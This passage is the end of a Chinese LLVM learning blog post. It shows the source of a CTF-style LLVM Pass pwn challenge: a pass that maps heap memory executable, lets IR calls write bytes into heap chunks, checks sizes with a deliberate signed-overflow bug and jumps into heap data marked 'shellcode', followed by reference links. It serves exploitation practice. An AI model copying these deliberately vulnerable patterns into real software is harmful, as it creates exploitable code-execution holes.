class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGSIZE  4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE-1))</span><br><span class="hljs-type">void</span> *table[<span class="hljs-number">10</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> chunk_size[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *treasuremap=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> init_done=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> money = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>	<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br>	<span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">10</span>)&#123;<br>		table[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x70</span>);<br>		chunk_size[i] = <span class="hljs-number">0x70</span>;<br>		i++;<br>	&#125;<br>	treasuremap = table[<span class="hljs-number">0</span>];<br>	<span class="hljs-type">int</span> flag=<span class="hljs-number">0</span>;<br>	<span class="hljs-type">void</span>* heap_addr = (<span class="hljs-type">void</span>*)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)table[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfffffffffffff000</span>);<br>	flag = <span class="hljs-built_in">mprotect</span>(heap_addr,<span class="hljs-number">0x8000</span>,PROT_EXEC | PROT_READ | PROT_WRITE);<br>	<span class="hljs-comment">//errs() &lt;&lt; &quot;modify address : &quot; &lt;&lt; heap_addr &lt;&lt; &#x27;\n&#x27;;</span><br>	<span class="hljs-comment">//errs() &lt;&lt; &quot;modify flag : &quot; &lt;&lt; flag &lt;&lt; &#x27;\n&#x27;;</span><br>	<span class="hljs-comment">//errs() &lt;&lt; &quot;heapbase : &quot; &lt;&lt; table[0] &lt;&lt; &#x27;\n&#x27;;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">buried</span><span class="hljs-params">()</span></span>&#123;<br>    scmp_filter_ctx ctx;<br>    ctx = <span class="hljs-built_in">seccomp_init</span>(SCMP_ACT_ALLOW);<br>    <span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="hljs-built_in">SCMP_SYS</span>(execve), <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="hljs-built_in">SCMP_SYS</span>(execveat), <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">seccomp_load</span>(ctx);<br>    <span class="hljs-comment">//close(1);</span><br>    <span class="hljs-comment">//close(2);</span><br>    <span class="hljs-comment">//errs() &lt;&lt; &quot;treasuremap : &quot; &lt;&lt; treasuremap &lt;&lt; &#x27;\n&#x27;;</span><br>    ((*(<span class="hljs-built_in">void</span>(*) ()) (treasuremap)))(); <span class="hljs-comment">//edit -&gt; shellcode</span><br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">optimizer</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;optimizer&gt; &#123;<br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(!init_done)&#123;<br>    	<span class="hljs-built_in">init</span>();<br>    	init_done = <span class="hljs-number">1</span>;<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Legend has it that there is a place where the treasure is buried.&quot;</span> &lt;&lt; std::endl;	 <br>    std::string VulnName = F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>();<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;You&#x27;re a young business man and you want to : &quot;</span> &lt;&lt; VulnName &lt;&lt; std::endl;<br>    <span class="hljs-keyword">if</span>(VulnName == <span class="hljs-string">&quot;start&quot;</span>)&#123;<br>      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="hljs-built_in">end</span>();<br>      <span class="hljs-keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter = F.<span class="hljs-built_in">begin</span>(); bbIter != bbEnd; ++bbIter)&#123;<br>        SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="hljs-built_in">begin</span>();<br>        SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="hljs-built_in">end</span>();<br>        <span class="hljs-keyword">for</span>(; instIter != instEnd; ++instIter)&#123;<br>          <span class="hljs-keyword">if</span> (instIter-&gt;<span class="hljs-built_in">getOpcode</span>() == <span class="hljs-number">56</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-type">const</span> CallInst* call_inst = <span class="hljs-built_in">dyn_cast</span>&lt;CallInst&gt;(instIter)) &#123;<br>              std::string FunctionName = call_inst-&gt;<span class="hljs-built_in">getCalledFunction</span>()-&gt;<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>();<br>              <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;sell&quot;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">2</span>)&#123;<br>                  <span class="hljs-type">int</span> idx1 =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                  <span class="hljs-keyword">if</span>(idx1&gt;=<span class="hljs-number">0</span> &amp;&amp; idx1&lt;<span class="hljs-number">10</span> &amp;&amp; (table[idx1]))&#123;<br>					<span class="hljs-built_in">free</span>(table[idx1]);<br>					table[idx1] = <span class="hljs-number">0</span>;<br>					money += chunk_size[idx1];<br>					chunk_size[idx1] = <span class="hljs-number">0</span>;<br>					std::cout &lt;&lt; <span class="hljs-string">&quot;selled a land&quot;</span> &lt;&lt; std::endl;<br>                  &#125;<br>                  <span class="hljs-keyword">else</span>&#123;<br>                  	std::cout &lt;&lt; <span class="hljs-string">&quot;failed to sell&quot;</span> &lt;&lt; std::endl;<br>                  &#125;<br>              	&#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;buy&quot;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">2</span>)&#123;<br>                	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();	<br>                	i=<span class="hljs-number">0</span>;<br>                	<span class="hljs-keyword">if</span>((<span class="hljs-type">int</span>)sz&lt;=money)&#123;     <span class="hljs-comment">//int overflow</span><br>                		<span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span> &amp;&amp; i&lt;=<span class="hljs-number">9</span>)&#123;   <br>							<span class="hljs-keyword">if</span>(!*(&amp;(table[<span class="hljs-number">0</span>])+i))&#123;<br>								*(&amp;(table[<span class="hljs-number">0</span>])+i) = <span class="hljs-built_in">malloc</span>(sz);<br>								std::cout &lt;&lt; <span class="hljs-string">&quot;buy a land at : &quot;</span>&lt;&lt; *(&amp;(table[<span class="hljs-number">0</span>])+i) &lt;&lt; std::endl;<br>								<span class="hljs-comment">//errs() &lt;&lt; &quot;buy a land&quot;&lt;&lt;&#x27;\n&#x27;;</span><br>								chunk_size[i] = sz;<br>								money -= sz;<br>								<span class="hljs-keyword">break</span>;<br>							&#125;<br>							<span class="hljs-keyword">else</span>&#123;<br>								i++;<br>							&#125;	<br>						&#125;<br>                	&#125;<br>              	&#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;edit&quot;</span>)&#123; <br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">3</span>)&#123;<br>                	<span class="hljs-type">int</span> idx2 =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                	<span class="hljs-keyword">if</span>(idx2&gt;=<span class="hljs-number">0</span> &amp;&amp; idx2&lt;=<span class="hljs-number">9</span>)&#123;<br>                    	Value* a = call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">1</span>);<br>                    	<span class="hljs-keyword">auto</span> a2 = call_inst-&gt;<span class="hljs-built_in">arg_begin</span>()-&gt;<span class="hljs-built_in">get</span>();<br>                    	<span class="hljs-keyword">auto</span> a3 = a-&gt;<span class="hljs-built_in">getType</span>();<br>                    	<span class="hljs-keyword">auto</span> a4 = <span class="hljs-built_in">dyn_cast</span>&lt;GlobalVariable&gt;(a);<br>                    	<span class="hljs-keyword">if</span>(a4)&#123;<br>                    		<span class="hljs-keyword">auto</span> a5 = <span class="hljs-built_in">dyn_cast</span>&lt;ConstantDataArray&gt;(a4-&gt;<span class="hljs-built_in">getInitializer</span>());<br>                    		<span class="hljs-keyword">if</span>(a5)&#123;<br>                    			<span class="hljs-keyword">auto</span> data = a5-&gt;<span class="hljs-built_in">getAsCString</span>();<br>   								<span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;edit a land&quot;</span>&lt;&lt;<span class="hljs-string">&#x27;\n&#x27;</span>;                 			<br>                    			i=<span class="hljs-number">0</span>;<br>                    			<span class="hljs-keyword">while</span>(i&lt;data.<span class="hljs-built_in">size</span>() &amp;&amp; i&lt;=chunk_size[idx2]<span class="hljs-number">-8</span>)&#123;<br>									*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i) = data[i];<br>									<br>									<span class="hljs-keyword">if</span>(*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i)==<span class="hljs-number">0x0f</span>)&#123;<br>										i++;<br>										*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i) = <span class="hljs-number">0x05</span>;<br>									&#125;<br>									<br>									<span class="hljs-comment">//errs() &lt;&lt; *((uint8_t*)table[idx2]+i);</span><br>									<br>									i++;<br>								&#125;<br>								<span class="hljs-comment">//errs() &lt;&lt; &quot; at &quot; &lt;&lt; table[idx2] &lt;&lt;&#x27;\n&#x27;;  								</span><br>                			&#125;<br>                		&#125;<br>                	&#125;<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;locate&quot;</span>)&#123;<br>              	<span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">1</span>)&#123;<br>              		std::cout &lt;&lt; <span class="hljs-string">&quot;locating treasure!&quot;</span> &lt;&lt; std::endl;<br>              		treasuremap = (<span class="hljs-type">uint8_t</span>*)treasuremap + <span class="hljs-built_in">rand</span>()%<span class="hljs-number">0x4000</span> + <span class="hljs-number">0x5000</span>;<br>                	<span class="hljs-built_in">buried</span>();<br>                	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;show&quot;</span>)&#123;<br>              	std::cout &lt;&lt; <span class="hljs-string">&quot;Your money now : &quot;</span> &lt;&lt; money &lt;&lt; std::endl;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;	    <br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK </span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;optimizer&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;optimizer&quot;</span>)&#123;  <br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">optimizer</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://llvm.org/docs/Reference.html">LLVM Language Reference Manual</a></p>
<p><a target="_blank" rel="noopener" href="https://llvm.org/(%E5%AE%98%E7%BD%91%E7%9A%84Documentation%E5%BE%88%E9%BD%90%E5%85%A8)">https://llvm.org/(官网的Documentation很齐全)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_38816924/article/details/114673548">[csdn]clang&amp;llvm简介</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Tu9oh0st/p/16143810.html">LLVM从小白到放弃（一）- LLVM概述与LLVM环境搭建 </a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7257">[先知社区]初探LLVM&amp;clang&amp;pass</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1367dad95445">[简书]深入浅出让你理解什么是LLVM</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276219.htm">[看雪]LLVM的IR指令详解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av93643665/?spm_id_from=333.788.b_765f64657363.1&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">[理论基础]南京大学软件分析课程</a></p>
<p>《LLVM编译器实战教程》(Getting Started with LLVM Core Libraries) </p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_7">[看雪]LLVM PASS PWN 总结</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="../../../../categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="category-chain-item">软件测试&amp;漏洞挖掘</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="../../../../tags/LLVM/">#LLVM</a>
      
        <a href="../../../../tags/Pass/">#Pass</a>
      
        <a href="../../../../tags/IR/">#IR</a>
      
        <a href="../../../../tags/%E7%BC%96%E8%AF%91%E5%99%A8/">#编译器</a>
      
        <a href="../../../../tags/Pwn/">#Pwn</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>LLVM学习记录</div>
      <div>https://lkliki.github.io/2023/10/03/LLVM学习记录/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>0P1N</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年10月3日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="../../13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/" title="动态二进制插桩工具Pin和pintools">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">动态二进制插桩工具Pin和pintools</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="../../../05/18/unlink/" title="unlink">
                        <span class="hidden-mobile">unlink</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href=""><span>fffer</span></a> <i class="iconfont icon-bug"></i> <a href="" target="_blank" rel="nofollow noopener"><span>0p1n</span></a> <br /> <a href=""><span>富强 民主 文明 和谐 自由 平等 公正 法治 爱国 敬业 诚信 友善</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="../../../../js/events.js" ></script>
<script  src="../../../../js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="../../../../js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="../../../../js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="../../../../js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
